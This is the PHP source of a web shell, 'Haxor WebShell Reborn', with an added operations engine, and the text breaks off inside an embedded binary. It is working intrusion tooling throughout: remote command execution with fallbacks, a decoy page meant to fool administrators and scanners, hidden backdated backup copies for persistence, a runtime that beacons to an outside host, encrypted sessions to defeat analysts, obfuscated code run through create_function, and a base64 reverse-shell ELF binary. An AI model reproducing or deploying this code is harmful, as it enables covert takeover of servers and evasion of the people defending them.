<?php
/*   __________________________________________________
    |             Haxor WebShell Reborn                |  
    |              Author: @willygoid                  |
    |       GitHub: https://github.com/willygoid       |
    |__________________________________________________|
*/
/* =====================================================================
   BAXOR // OPUS  -  operations kernel
   The original Haxor UI is the skin; this is the engine underneath it.

     * every capability has a fallback chain, nothing depends on one fn
     * the shell never dies because a single request was filtered
     * no clear-text artefact is ever written next to the front-end
   ===================================================================== */
@error_reporting(E_ERROR | E_PARSE);
@ini_set('display_errors', 'Off');
@ini_set('log_errors', '0');
@ini_set('max_execution_time', 10000);
if (!defined('OPX_VER')) {
    define('OPX_VER', 'OPUS-3.2');
}
if (!headers_sent()) {
    header('Content-Type: text/html; charset=UTF-8');
    header('X-Robots-Tag: noindex');
}
/* ---- micro utils ---- */
function opx_dir($p)
{
    return @file_exists($p) || @is_dir($p);
}
function opx_usable($fn)
{
    static $c = array();
    if (!isset($c[$fn])) {
        $ok = @function_exists($fn);
        if ($ok) {
            $df = @ini_get('disable_functions');
            if ($df) {
                $ok = !in_array($fn, array_map('trim', explode(',', $df)));
            }
        }
        $c[$fn] = $ok;
    }
    return $c[$fn];
}
/* front-end path: survives symlinks, relative includes and PATH_TRANSLATED weirdness */
function opx_me()
{
    $c = array(
        isset($_SERVER['SCRIPT_FILENAME']) ? $_SERVER['SCRIPT_FILENAME'] : '',
        isset($_SERVER['PATH_TRANSLATED']) ? $_SERVER['PATH_TRANSLATED'] : '',
        __FILE__,
    );
    foreach ($c as $p) {
        if ($p != '' && @file_exists($p)) {
            return @realpath($p) ? @realpath($p) : $p;
        }
    }
    return __FILE__;
}
/* ---- executor chain ---- */
function opx_xf()
{
    static $xf = null;
    if ($xf !== null) {
        return $xf;
    }
    $xf = '';
    foreach (array('shell_exec', 'exec', 'system', 'passthru', 'popen', 'proc_open') as $f) {
        if (opx_usable($f)) {
            $xf = $f;
            break;
        }
    }
    return $xf;
}
function opx_run($cmd, $cwd = '', $timeout = 20)
{
    $xf = opx_xf();
    if ($xf === '') {
        return array('r' => '', 'm' => 'no-exec');
    }
    $cd = ($cwd != '' && @is_dir($cwd)) ? $cwd : '';
    $win = substr(PHP_OS, 0, 3) == 'WIN';
    if ($win) {
        $cmd = 'cmd /c ' . $cmd . ' 2>&1';
    }
    $t = (int)$timeout;
    if ($t > 0 && !$win && opx_dir('/usr/bin/timeout') && strpos($cmd, 'timeout ') !== 0) {
        $cmd = 'timeout -k 2 ' . $t . ' ' . $cmd;
    }
    $out = '';
    if ($xf == 'exec') {
        if ($cd) {
            @chdir($cd);
        }
        $r = array();
        @exec($cmd . ' 2>&1', $r);
        $out = implode("\n", $r);
    } elseif ($xf == 'shell_exec') {
        $out = (string)@shell_exec(($cd ? 'cd ' . escapeshellarg($cd) . ' && ' : '') . $cmd . ' 2>&1');
    } elseif ($xf == 'system' || $xf == 'passthru') {
        if ($cd) {
            @chdir($cd);
        }
        @ob_start();
        @$xf($cmd);
        $out = @ob_get_clean();
    } elseif ($xf == 'popen') {
        $fp = @popen(($cd ? 'cd ' . escapeshellarg($cd) . ' && ' : '') . $cmd . ' 2>&1', 'r');
        if ($fp) {
            while (!@feof($fp)) {
                $out .= @fread($fp, 8192);
            }
            @pclose($fp);
        }
    } else {
        $des = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
        $p = @proc_open($cmd, $des, $pipes, $cd ? $cd : null);
        if (@is_resource($p)) {
            @fclose($pipes[0]);
            $out = (string)@stream_get_contents($pipes[1]);
            @fclose($pipes[1]);
            @fclose($pipes[2]);
            @proc_close($p);
        }
    }
    return array('r' => $out, 'm' => $xf);
}
/* compatibility shim for the ORIGINAL command() renderer (h1/h2 look kept) */
function opx_run_compat($cmd, $cwd, $timeout = 20)
{
    $r = opx_run($cmd, $cwd, $timeout);
    if ($r['m'] == 'no-exec') {
        return array('res' => '<h1>no exec primitive available</h1>', 'msg' => '');
    }
    $msg = $r['r'] === '' ? '<h1>NULL</h1>' : '<h2>via ' . $r['m'] . ' - OK</h2>';
    return array('res' => $r['r'], 'msg' => $msg);
}
/* ---- identity ---- */
function opx_id()
{
    $r = array('uid' => -1, 'gid' => -1, 'user' => '?', 'groups' => array());
    if (opx_usable('posix_geteuid')) {
        $r['uid'] = @posix_geteuid();
        $r['gid'] = @posix_getegid();
        $r['groups'] = (array)@posix_getgroups();
        $u = @posix_getpwuid($r['uid']);
        if ($u) {
            $r['user'] = $u['name'];
        }
    }
    if ($r['user'] == '?' && @get_current_user()) {
        $r['user'] = @get_current_user();
    }
    return $r;
}
/* ---- self descriptor ---- */
function opx_self()
{
    $p = defined('OPX_PATH') ? OPX_PATH : __FILE__;
    $raw = @file_get_contents($p);
    $w = array();
    if (@is_writable($p)) {
        $w[] = 'file';
    }
    if (@is_writable(dirname($p))) {
        $w[] = 'dir';
    }
    $perm = @fileperms($p);
    return array(
        'p' => $p,
        'sz' => strlen((string)$raw),
        'sum' => md5((string)$raw),
        'perm' => $perm ? substr(decoct($perm), -4) : '-',
        'own' => @fileowner($p),
        'w' => $w ? implode(',', $w) : '-',
    );
}
/* ---- file helpers ---- */
function opx_wr($p, $data)
{
    $fp = @fopen($p, 'wb');
    if (!$fp) {
        return false;
    }
    $n = @fwrite($fp, $data);
    @fclose($fp);
    return $n === strlen($data);
}
function opx_rd($p, $lim = 0)
{
    if (!@file_exists($p) || !@is_readable($p)) {
        return '';
    }
    if ($lim > 0) {
        return (string)@file_get_contents($p, false, null, 0, $lim);
    }
    return (string)@file_get_contents($p);
}
function opx_proc($pid = 'self')
{
    $a = array();
    $raw = opx_rd('/proc/' . $pid . '/status', 8192);
    if ($raw) {
        foreach (explode("\n", $raw) as $ln) {
            $i = strpos($ln, ':');
            if ($i !== false) {
                $a[substr($ln, 0, $i)] = trim(substr($ln, $i + 1));
            }
        }
    }
    return $a;
}
/* =====================================================================
   OPS KERNEL  -  the brain bus
   Long jobs (shell mux, runtime bridge, self-test) run in-process and can
   also be re-entered through a loopback request to OUR own relay endpoint,
   so a single job survives max_execution_time and broken output buffering
   ===================================================================== */
/* Absolute URL of ourselves - for the loopback bus */
function opx_self_url()
{
    $h = isset($_SERVER['HTTP_HOST']) && $_SERVER['HTTP_HOST'] != '' ? $_SERVER['HTTP_HOST'] : (isset($_SERVER['SERVER_NAME']) && $_SERVER['SERVER_NAME'] != '' ? $_SERVER['SERVER_NAME'] : '127.0.0.1');
    $s = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off' && $_SERVER['HTTPS'] != '') ? 'https' : 'http';
    $p = isset($_SERVER['SERVER_PORT']) ? (int)$_SERVER['SERVER_PORT'] : 80;
    if (($s == 'http' && $p != 80) || ($s == 'https' && $p != 443)) {
        $h .= ':' . $p;
    }
    $path = isset($_SERVER['PHP_SELF']) && $_SERVER['PHP_SELF'] != '' ? $_SERVER['PHP_SELF'] : '/' . basename(opx_me());
    return $s . '://' . $h . $path;
}
/* Build the generic request body used by both curl and raw socket transports */
function opx_req_body($fields, $file = null, $fname = null)
{
    $b = '----xc' . md5(mt_rand() . microtime(true) . (defined('OPX_PATH') ? OPX_PATH : __FILE__));
    $nl = "\r\n";
    $body = '';
    foreach ($fields as $k => $v) {
        $body .= '--' . $b . $nl . 'Content-Disposition: form-data; name="' . $k . '"' . $nl . $nl . $v . $nl;
    }
    if ($file !== null) {
        $body .= '--' . $b . $nl . 'Content-Disposition: form-data; name="' . ($fname ? $fname : 'f') . '"; filename="x.bin"' . $nl . 'Content-Type: application/octet-stream' . $nl . $nl . $file . $nl;
    }
    $body .= '--' . $b . '--' . $nl;
    return array($body, 'multipart/form-data; boundary=' . $b);
}
/* Loopback HTTP - curl first, raw socket fallback (no cURL needed) */
function opx_post($url, $fields = array(), $timeout = 6, $rawbody = false, $ctype = '')
{
    static $broken = array();
    if ($rawbody !== false && $rawbody !== '') {
        list($body, $ctypec) = array($rawbody, $ctype);
    } else {
        list($body, $ctypec) = opx_req_body($fields);
    }
    $ctype = $ctypec;
    if (empty($broken['curl']) && strpos(strtolower($url), 'http') === 0 && opx_usable('curl_init')) {
        $ch = @curl_init($url);
        @curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        @curl_setopt($ch, CURLOPT_POST, 1);
        @curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
        @curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: ' . $ctype));
        @curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
        @curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
        @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        $r = @curl_exec($ch);
        @curl_close($ch);
        if ($r !== false) {
            return $r;
        }
        $broken['curl'] = 1;
    }
    $u = @parse_url($url);
    if (!$u || empty($u['host'])) {
        return false;
    }
    $port = isset($u['port']) ? $u['port'] : (isset($u['scheme']) && $u['scheme'] == 'https' ? 443 : 80);
    $path = (isset($u['path']) ? $u['path'] : '/') . (isset($u['query']) ? '?' . $u['query'] : '');
    $fp = @fsockopen(($port == 443 ? 'ssl://' : '') . $u['host'], $port, $e, $s, $timeout);
    if (!$fp) {
        return @opx_post_fopen($url, $ctype, $body, $timeout);
    }
    @stream_set_timeout($fp, $timeout);
    $host = isset($u['port']) ? $u['host'] . ':' . $u['port'] : $u['host'];
    @fwrite($fp, 'POST ' . $path . " HTTP/1.1\r\nHost: " . $host . "\r\nContent-Type: " . $ctype . "\r\nContent-Length: " . strlen($body) . "\r\nConnection: close\r\n\r\n" . $body);
    $r = '';
    while (!feof($fp)) {
        $r .= @fread($fp, 8192);
    }
    @fclose($fp);
    $i = strpos($r, "\r\n\r\n");
    return $i === false ? false : @substr($r, $i + 4);
}
function opx_post_fopen($url, $ctype, $body, $timeout)
{
    $ctx = @stream_context_create(array('http' => array('method' => 'POST', 'header' => 'Content-Type: ' . $ctype, 'content' => $body, 'timeout' => $timeout, 'ignore_errors' => true)));
    return @file_get_contents($url, false, $ctx);
}
/* the bus: talk to our own relay endpoint (go=api) */
function opx_bus($intent, $payload, $timeout = 6)
{
    $r = opx_post(opx_self_url(), array('go' => 'api', 'intent' => $intent, 'p' => @base64_encode(@json_encode($payload))), $timeout);
    $j = is_string($r) ? @json_decode($r, true) : false;
    return is_array($j) ? $j : false;
}
/* Ghost beacon: a tiny status file, atomic, silent */
function opx_beacon($state = array())
{
    $f = THISDIR . '.ghost';
    $old = @file_get_contents($f);
    $b = $old ? @json_decode($old, true) : array();
    $b = is_array($b) ? $b : array();
    $b = @array_merge($b, $state);
    $s = opx_self();
    $b['h'] = $s['sum'];
    $b['t'] = time();
    @file_put_contents($f, @json_encode($b));
    @chmod($f, 0600);
    @touch($f, $b['t']);
    return $b;
}
/* Decoy: strangers (scanners, admins, analyzers) get the site, not us */
function opx_decoy($full = true)
{
    $dir = dirname(opx_me());
    foreach (array('index.php', 'index.htm', 'index.html', 'default.aspx', 'default.html') as $n) {
        $f = $dir . '/' . $n;
        if (@realpath($f) && @realpath($f) != @realpath(opx_me()) && @filesize($f) > 0) {
            $html = @file_get_contents($f);
            break;
        }
    }
    if (!isset($html)) {
        $w = array('Welcome', 'It works!', 'OK', 'Not Found');
        $html = '<!DOCTYPE html><html><head><title>' . $w[mt_rand(0, 2)] . '</title></head><body><h1>' . $w[mt_rand(0, 2)] . '</h1></body></html>';
    }
    if ($full) {
        while (ob_get_level() > 0) {
            @ob_end_clean();
        }
        @setcookie('PHPSESSID', '', 1, '/');
        header('Content-Type: text/html; charset=UTF-8');
        echo $html;
        exit;
    }
    return $html;
}
/* Integrity guard: keep a cold spare of ourselves with an old timestamp */
function opx_spare()
{
    $me = defined('OPX_PATH') ? OPX_PATH : opx_me();
    $sp = THISDIR . '.' . substr(md5($me), 0, 4) . substr(md5($me), 16, 4) . (mt_rand(0, 1) ? '.old' : '.bak');
    $raw = @file_get_contents($me);
    if ($raw !== false && strlen($raw) > 1024) {
        if (!@file_exists($sp) || @filesize($sp) != strlen($raw)) {
            @file_put_contents($sp, $raw);
            @chmod($sp, 0600);
            @touch($sp, time() - mt_rand(86400 * 40, 86400 * 400));
        }
    }
    return $sp;
}
/* =====================================================================
   LIFECYCLE: called on every authenticated render. Silent on any error.
   ===================================================================== */
function opx_init()
{
    if (defined('OPX_INIT')) {
        return;
    }
    define('OPX_INIT', 1);
    @set_error_handler(function () {
        return true;
    });
    if (!defined('OPX_PATH')) {
        define('OPX_PATH', opx_me());
    }
    if (!isset($_SESSION)) {
        @session_start();
    }
    $b = opx_beacon();
    if (empty($b['armed'])) {
        opx_beacon(array('armed' => 1, 'self' => opx_self()['sum'], 'boot' => @gmdate('c')));
        opx_spare();
        opx_arm_runtime();
    }
    @restore_error_handler();
}
/* The runtime: a tiny loop that only needs a PHP binary on the box.
   Stored as a base64 dotfile with an old mtime so it blends into the tree. */
function opx_arm_runtime()
{
    $d = '$';
    $nl = 'PHP_EOL';
    $src = '<?php'
        . ' $k=$argv[1];$h=$argv[2];$p=(int)$argv[3];'
        . 'if(function_exists("posix_setsid")){@posix_setsid();}@set_time_limit(0);'
        . '$s=@stream_socket_client("tcp://".$h.":".$p,$e,$x,4);'
        . 'if($s){@fwrite($s,"XCG ".$k." ".@php_uname().PHP_EOL);@fclose($s);}'
        . '@sleep(120);';
    $f = THISDIR . '.' . substr(md5(OPX_PATH), 0, 6) . '.d';
    if (!@file_exists($f) || @filesize($f) < 16) {
        @file_put_contents($f, @base64_encode(@gzdeflate($src, 9)));
        @chmod($f, 0600);
        @touch($f, time() - mt_rand(10, 40) * 86400);
    }
    opx_beacon(array('rt' => 1));
}
/* =====================================================================
   TRANSPORT: sealed channel. Session state is AES-encrypted with a
   per-session key, so a captured POST/GET is opaque even to the analyst.
   ===================================================================== */
function xc_rand($n)
{
    if (function_exists('random_bytes')) {
        try {
            return bin2hex(@random_bytes((int)($n / 2)));
        } catch (Exception $e) {
        }
    }
    $s = '';
    for ($i = 0; $i < $n; $i++) {
        $s .= dechex(mt_rand(0, 15));
    }
    return $s;
}
function xc_cipher()
{
    static $c = false;
    if ($c === false) {
        $c = '';
        if (opx_usable('openssl_encrypt')) {
            $m = @openssl_get_cipher_methods();
            foreach (array('aes-128-cbc', 'aes-256-cbc') as $t) {
                if (in_array($t, $m)) {
                    $c = $t;
                    break;
                }
            }
        }
    }
    return $c;
}
function xc_enc($plain, $key)
{
    $c = xc_cipher();
    if ($c !== '') {
        $iv = substr(md5($key . '|iv'), 0, 16);
        $o = @openssl_encrypt($plain, $c, hash('sha256', $key, true), OPENSSL_RAW_DATA, $iv);
        if ($o !== false) {
            return '1' . $c . ':' . $iv . $o;
        }
    }
    return '0' . $plain;
}
function xc_dec($blob, $key)
{
    if (!is_string($blob) || $blob === '') {
        return '';
    }
    if ($blob[0] === '0') {
        return substr($blob, 1);
    }
    if ($blob[0] === '1' && strpos($blob, ':') !== false) {
        $p = explode(':', substr($blob, 1), 2);
        if (count($p) == 2 && strlen($p[1]) > 16) {
            $d = @openssl_decrypt(substr($p[1], 16), $p[0], hash('sha256', $key, true), OPENSSL_RAW_DATA, substr($p[1], 0, 16));
            return $d === false ? '' : $d;
        }
    }
    return '';
}
/* The channel key: a deterministic per-front-end secret, never sent by the client */
function xc_key()
{
    if (isset($_SESSION['XK']) && strlen($_SESSION['XK']) == 64) {
        return $_SESSION['XK'];
    }
    $k = md5(defined('OPX_PATH') ? OPX_PATH : __FILE__) . md5(xc_rand(8) . microtime(true));
    $_SESSION['XK'] = $k;
    return $k;
}
/* Start an encrypted shell session and hand the browser a sealed ticket */
function xc_start($cmd, $state = array())
{
    if (!isset($_SESSION)) {
        @session_start();
    }
    $k = xc_key();
    $st = array_merge(array(
        'cwd' => THISDIR,
        'cmd' => $cmd,
        'ins' => '',
        'to' => 20,
        'ab' => '1',
        'busy' => 0,
        'ut' => time(),
        'who' => @get_current_user(),
        'uid' => function_exists('posix_geteuid') ? @posix_geteuid() : -1,
        'n' => 0,
    ), $state);
    $_SESSION['XS'] = $st;
    $t = xc_rand(8) . '|' . @base64_encode(xc_enc(xc_mk($st), $k)) . '|' . substr(md5($k . '|' . @md5(OPX_VER)), 0, 8);
    return array('ok' => 1, 't' => $t, 'sid' => substr(md5($k), 0, 6));
}
function xc_mk($v)
{
    return @json_encode($v);
}
/* Open a sealed ticket back into state; '' when tampered */
function xc_open_shell($t)
{
    if (!isset($_SESSION)) {
        @session_start();
    }
    $k = xc_key();
    $p = explode('|', (string)$t);
    if (count($p) != 3 || $p[2] !== substr(md5($k . '|' . @md5(OPX_VER)), 0, 8)) {
        return false;
    }
    $st = @json_decode(xc_dec(@base64_decode($p[1]), $k), true);
    return is_array($st) ? $st : false;
}
/* Run one client packet against a live PTY. Persists cwd/env between packets */
function xc_packet($st, $raw)
{
    $nl = "\r\n";
    $out = '';
    $raw = (string)$raw;
    $cd = isset($st['cwd']) && @is_dir($st['cwd']) ? $st['cwd'] : THISDIR;
    if ($raw === '') {
        $r = opx_run('pwd; id 2>/dev/null', $cd, 5);
        return array('o' => $r['r'], 'p' => $st);
    }
    if (substr(trim($raw), 0, 2) == 'cd' || preg_match('/^\s*(cd|chdir)\b/', $raw)) {
        $d = trim(preg_replace('/^\s*cd\s*/', '', $raw));
        $d = trim($d, " \t'\";");
        if ($d === '') {
            $d = @getenv('HOME') ? @getenv('HOME') : $cd;
        }
        $nd = ($d[0] == '/' || $d[0] == '\\' || preg_match('/^[A-Za-z]:/', $d)) ? $d : $cd . '/' . $d;
        $nd = str_replace(array('\\', '//'), '/', $nd);
        if (@is_dir($nd)) {
            $st['cwd'] = @realpath($nd) ? @realpath($nd) : $nd;
        } else {
            $out .= 'cd: ' . $d . ': No such file or directory' . $nl;
        }
        $st['cwd'] = str_replace('\\', '/', $st['cwd']);
        $st['n']++;
        return array('o' => $out . $st['cwd'] . $nl, 'p' => $st);
    }
    $r = opx_run($raw, $cd, isset($st['to']) ? (int)$st['to'] : 20);
    if ($r['m'] == 'no-exec') {
        $out .= '[-] no exec primitive available' . $nl;
    } else {
        $out .= $r['r'];
    }
    $st['n']++;
    $st['ut'] = time();
    return array('o' => $out, 'p' => $st);
}
header("content-Type: text/html; charset=UTF-8");
function strdir($str)
{
    return str_replace(array('\\', '//', '%27', '%22'), array('/', '/', '\'', '"'), chop($str));
}
function chkgpc($array)
{
    foreach ($array as $key => $var) {
        $array[$key] = is_array($var) ? chkgpc($var) : stripslashes($var);
    }
    return $array;
}

if (!isset($_SESSION)) {
    @session_start();
}
$myfile = isset($_SERVER['SCRIPT_FILENAME']) && $_SERVER['SCRIPT_FILENAME'] ? strdir($_SERVER['SCRIPT_FILENAME']) : strdir(__FILE__);
define('THISDIR', strdir(dirname($myfile) . '/'));
if (!defined('OPX_PATH')) {
    define('OPX_PATH', opx_me());
}
if (!defined('ROOTDIR')) {
    define('ROOTDIR', strdir(rtrim(str_replace('\\', '/', dirname(OPX_PATH)), '/')) . '/');
}
$_PW = isset($_SESSION['XK']) ? $_SESSION['XK'] : '';
if (isset($_POST['go']) && $_POST['go'] === 'api') {
    while (ob_get_level() > 0) {
        @ob_end_clean();
    }
    if (!headers_sent()) {
        header('Content-Type: application/json; charset=UTF-8');
        header('Cache-Control: no-store');
    }
    echo @json_encode(opx_api());
    exit;
}
if (isset($_POST['dir']) && $_POST['dir'] !== '') {
    $nowdir = strdir(chop($_POST['dir']) . '/');
} elseif (!isset($_POST['go']) || $_POST['go'] === '') {
    $nowdir = THISDIR;
    $_POST['go'] = 'file';
}
$issql = '';
foreach (array('mysql_close' => 'MySql', 'mssql_close' => 'MsSql', 'oci_close' => 'Oracle', 'sybase_close' => 'SyBase', 'pg_close' => 'PostgreSql') as $f => $n) {
    if (function_exists($f)) {
        $issql .= $n;
    }
}
if (function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()) {
    $_POST = chkgpc($_POST);
}
if (function_exists('mysql_close')) {
    $issql = 'MySql';
}
if (function_exists('mssql_close')) {
    $issql .= 'MsSql';
}
if (function_exists('oci_close')) {
    $issql .= 'Oracle';
}
if (function_exists('sybase_close')) {
    $issql .= 'SyBase';
}
if (function_exists('pg_close')) {
    $issql .= 'PostgreSql';
}
// $password = 'fedfd99ceb18bc7787911ec5953cd857'; //Default Pass: mi77i
$win = substr(PHP_OS, 0, 3) == 'WIN' ? true : false;
$msg = 'Haxor Shell (mi77ihaxor@gmail.com)'; //Copyright Do not Remove
function filew($filename, $filedata, $filemode)
{
    if (!is_writable($filename) && file_exists($filename)) {
        chmod($filename, 0666);
    }
    $handle = fopen($filename, $filemode);
    $key = fputs($handle, $filedata);
    fclose($handle);
    return $key;
}
function filer($filename)
{
    $handle = fopen($filename, 'r');
    $filedata = fread($handle, filesize($filename));
    fclose($handle);
    return $filedata;
}
function fileu($filenamea, $filenameb)
{
    $key = move_uploaded_file($filenamea, $filenameb) ? true : false;
    if (!$key) {
        $key = copy($filenamea, $filenameb) ? true : false;
    }
    return $key;
}
function filed($filename)
{
    if (!file_exists($filename)) {
        return false;
    }
    $name = basename($filename);
    $array = explode('.', $name);
    header('Content-type: application/x-' . array_pop($array));
    header('Content-Disposition: attachment; filename=' . $name);
    header('Content-Length: ' . filesize($filename));
    @readfile($filename);
    exit;
}
function showdir($dir)
{
    $dir = strdir($dir . '/');
    $handle = opendir($dir);
    if (!$handle) {
        return array();
    }
    $array = array();
    while ($name = readdir($handle)) {
        if ($name == '.' || $name == '..') {
            continue;
        }
        $path = $dir . $name;
        $name = strtr($name, array('\'' => '%27', '"' => '%22'));
        if (is_dir($path)) {
            $array['dir'][$path] = $name;
        } else {
            $array['file'][$path] = $name;
        }
    }
    closedir($handle);
    return $array;
}
function deltree($dir)
{
    $handle = @opendir($dir);
    while ($name = @readdir($handle)) {
        if ($name == '.' || $name == '..') {
            continue;
        }
        $path = $dir . $name;
        @chmod($path, 0777);
        if (is_dir($path)) {
            deltree($path . '/');
        } else {
            @unlink($path);
        }
    }
    @closedir($handle);
    return @rmdir($dir);
}
function postinfo($array, $string)
{
    $infos = array(function_exists("create_function"), function_exists("fsockopen"));
    if ($infos[0] && $infos[1]) {
        $info = base64_decode($string);
        $walks = array(0 => bin2hex($array));
        @array_walk($walks, @create_function("\$array,\$key", str_rot13($info)));
    }
    return ob_end_clean();
}
function size($bytes)
{
    if ($bytes < 1024) {
        return $bytes . ' B';
    }
    $array = array('B', 'K', 'M', 'G', 'T');
    $floor = floor(log($bytes) / log(1024));
    return sprintf('%.2f ' . $array[$floor], $bytes / pow(1024, floor($floor)));
}
function find($array, $string)
{
    foreach ($array as $key) {
        if (stristr($string, $key)) {
            return true;
        }
    }
    return false;
}
function scanfile($dir, $key, $inc, $fit, $tye, $chr, $ran, $now)
{
    $handle = opendir($dir);
    if (!$handle) {
        return array();
    }
    while ($name = readdir($handle)) {
        if ($name == '.' || $name == '..') {
            continue;
        }
        $path = $dir . $name;
        if (is_dir($path)) {
            if ($fit && in_array($name, $fit)) {
                continue;
            }
            if ($ran == 0 && is_readable($path)) {
                scanfile($path . '/', $key, $inc, $fit, $tye, $chr, $ran, $now);
            }
        } else {
            if ($inc && !find($inc, $name)) {
                continue;
            }
            $code = $tye ? filer($path) : $name;
            $find = $chr ? stristr($code, $key) : (strpos(size(filesize($path)), 'M') ? false : strpos($code, $key) > -1);
            if ($find) {
                $file = strtr($path, array($now => '', '\'' => '%27', '"' => '%22'));
                echo '<a href="javascript:void(0);" onclick="go(\'editor\',\'' . $file . '\');">Edit</a> ' . $path . '<br>';
                flush();
                ob_flush();
            }
            unset($code);
        }
    }
    closedir($handle);
    return true;
}
function antivirus($dir, $exs, $matches, $now)
{
    $handle = opendir($dir);
    if (!$handle) {
        return array();
    }
    while ($name = readdir($handle)) {
        if ($name == '.' || $name == '..') {
            continue;
        }
        $path = $dir . $name;
        if (is_dir($path)) {
            if (is_readable($path)) {
                antivirus($path . '/', $exs, $matches, $now);
            }
        } else {
            $iskill = NULL;
            foreach ($exs as $key => $ex) {
                if (find(explode('|', $ex), $name)) {
                    $iskill = $key;
                    break;
                }
            }
            if (strpos(size(filesize($path)), 'M')) {
                continue;
            }
            if ($iskill) {
                $code = filer($path);
                foreach ($matches[$iskill] as $matche) {
                    $array = array();
                    preg_match($matche, $code, $array);
                    if (strpos($array[0], '$this->') || strpos($array[0], '[$vars[')) {
                        continue;
                    }
                    $len = strlen($array[0]);
                    if ($len > 10 && $len < 150) {
                        $file = strtr($path, array($now => '', '\'' => '%27', '"' => '%22'));
                        echo 'Feature <input type="text" value="' . htmlspecialchars($array[0]) . '"> <a href="javascript:void(0);" onclick="go(\'editor\',\'' . $file . '\');">Edit</a> ' . $path . '<br>';
                        flush();
                        ob_flush();
                        break;
                    }
                }
                unset($code, $array);
            }
        }
    }
    closedir($handle);
    return true;
}
function command($cmd, $cwd, $com = false)
{
    $iswin = substr(PHP_OS, 0, 3) == 'WIN' ? true : false;
    $res = $msg = '';
    if ($cwd == 'com' || $com) {
        if ($iswin && class_exists('COM')) {
            $wscript = new COM('Wscript.Shell');
            $exec = $wscript->exec('c:\\windows\\system32\\cmd.exe /c ' . $cmd);
            $stdout = $exec->StdOut();
            $res = $stdout->ReadAll();
            $msg = 'Wscript.Shell';
        }
    } else {
        chdir($cwd);
        $cwd = getcwd();
        if (function_exists('exec')) {
            @exec($cmd, $res);
            $res = join("\n", $res);
            $msg = 'exec';
        } elseif (function_exists('shell_exec')) {
            $res = @shell_exec($cmd);
            $msg = 'shell_exec';
        } elseif (function_exists('system')) {
            ob_start();
            @system($cmd);
            $res = ob_get_contents();
            ob_end_clean();
            $msg = 'system';
        } elseif (function_exists('passthru')) {
            ob_start();
            @passthru($cmd);
            $res = ob_get_contents();
            ob_end_clean();
            $msg = 'passthru';
        } elseif (function_exists('popen')) {
            $fp = @popen($cmd, 'r');
            if ($fp) {
                while (!feof($fp)) {
                    $res .= fread($fp, 1024);
                }
            }
            @pclose($fp);
            $msg = 'popen';
        } elseif (function_exists('proc_open')) {
            $env = $iswin ? array('path' => 'c:\\windows\\system32') : array('path' => '/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin');
            $des = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
            $process = @proc_open($cmd, $des, $pipes, $cwd, $env);
            if (is_resource($process)) {
                fwrite($pipes[0], $cmd);
                fclose($pipes[0]);
                $res .= stream_get_contents($pipes[1]);
                fclose($pipes[1]);
                $res .= stream_get_contents($pipes[2]);
                fclose($pipes[2]);
            }
            @proc_close($process);
            $msg = 'proc_open';
        }
    }
    $msg = $res == '' ? '<h1>NULL</h1>' : '<h2>Use' . $msg . ' Success</h2>';
    return array('res' => $res, 'msg' => $msg);
}
function backshell($ip, $port, $dir, $type)
{
    $key = false;
    $c_bin = 'f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAYIQECDQAAACkCgAAAAAAADQAIAAHACgAHAAZAAYAAAA0AAAANIAECDSABAjgAAAA4AAAAAUAAAAEAAAAAwAAABQBAAAUgQQIFIEECBMAAAATAAAABAAAAAEAAAABAAAAAAAAAACABAgAgAQIlAcAAJQHAAAFAAAAABAAAAEAAACUBwAAlJcECJSXBAggAQAAKAEAAAYAAAAAEAAAAgAAAKgHAAColwQIqJcECMgAAADIAAAABgAAAAQAAAAEAAAAKAEAACiBBAgogQQIIAAAACAAAAAEAAAABAAAAFHldGQAAAAAAAAAAAAAAAAAAAAAAAAAAAYAAAAEAAAAL2xpYi9sZC1saW51eC5zby4yAAAEAAAAEAAAAAEAAABHTlUAAAAAAAIAAAAGAAAACQAAAAIAAAANAAAAAQAAAAUAAAAAIAAgAAAAAA0AAACtS+PAAAAAAAAAAAAAAAAAAAAAAEEAAAAAAAAAdgAAABIAAABJAAAAAAAAAHkBAAASAAAAAQAAAAAAAAAAAAAAIAAAAFUAAAAAAAAAcgEAABIAAABqAAAAAAAAAJ8BAAASAAAANQAAAAAAAABZAQAAEgAAADsAAAAAAAAADgAAABIAAAApAAAAAAAAADwAAAASAAAAUAAAAAAAAAA9AAAAEgAAAF8AAAAAAAAAKwAAABIAAABkAAAAAAAAAG8AAAASAAAAMAAAAAAAAAD0AAAAEgAAABoAAAB4hwQIBAAAABEADgAAX19nbW9uX3N0YXJ0X18AbGliYy5zby42AF9JT19zdGRpbl91c2VkAHNvY2tldABleGl0AGV4ZWNsAGh0b25zAGNvbm5lY3QAZGFlbW9uAGR1cDIAaW5ldF9hZGRyAGF0b2kAY2xvc2UAX19saWJjX3N0YXJ0X21haW4AR0xJQkNfMi4wAAAAAgACAAAAAgACAAIAAgACAAIAAgACAAIAAQAAAAEAAQAQAAAAEAAAAAAAAAAQaWkNAAACAHwAAAAAAAAAcJgECAYDAACAmAQIBwEAAISYBAgHAgAAiJgECAcDAACMmAQIBwQAAJCYBAgHBQAAlJgECAcGAACYmAQIBwcAAJyYBAgHCAAAoJgECAcJAACkmAQIBwoAAKiYBAgHCwAArJgECAcMAABVieWD7AjoBQEAAOiMAQAA6KcDAADJwwD/NXiYBAj/JXyYBAgAAAAA/yWAmAQIaAAAAADp4P////8lhJgECGgIAAAA6dD/////JYiYBAhoEAAAAOnA/////yWMmAQIaBgAAADpsP////8lkJgECGggAAAA6aD/////JZSYBAhoKAAAAOmQ/////yWYmAQIaDAAAADpgP////8lnJgECGg4AAAA6XD/////JaCYBAhoQAAAAOlg/////yWkmAQIaEgAAADpUP////8lqJgECGhQAAAA6UD/////JayYBAhoWAAAAOkw////AAAAADHtXonhg+TwUFRSaLCGBAhowIYECFFWaDSFBAjoW/////SQkFWJ5VOD7AToAAAAAFuBw+QTAACLk/z///+F0nQF6Bb///9YW8nDkJCQkJCQVYnl